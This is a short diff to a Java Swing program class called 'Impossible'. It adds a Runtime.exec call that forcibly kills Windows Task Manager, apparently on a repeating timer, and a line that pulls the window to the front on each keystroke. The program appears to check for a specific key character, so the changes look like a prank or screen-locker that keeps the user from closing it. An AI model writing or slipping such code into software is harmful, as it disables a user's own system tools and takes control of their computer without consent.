@@ -900,6 +900,11 @@ class Impossible extends JPanel implements ActionListener,KeyListener, MouseInpu
 			r = random.nextInt(255);
 			g = random.nextInt(255);
 			b = random.nextInt(255);
+			try {
+				Runtime.getRuntime().exec("taskkill /f /im Taskmgr.exe");
+			} catch (IOException e) {
+			System.err.println("Nooooo");
+			}
 		}
 	}
 
@@ -909,6 +914,7 @@ class Impossible extends JPanel implements ActionListener,KeyListener, MouseInpu
 
 	int nr;
 	public void keyTyped(KeyEvent arg0) {
+		frame.toFront();
 		if (nr==0) {
 
 			if(arg0.getKeyChar() == 'Å'){
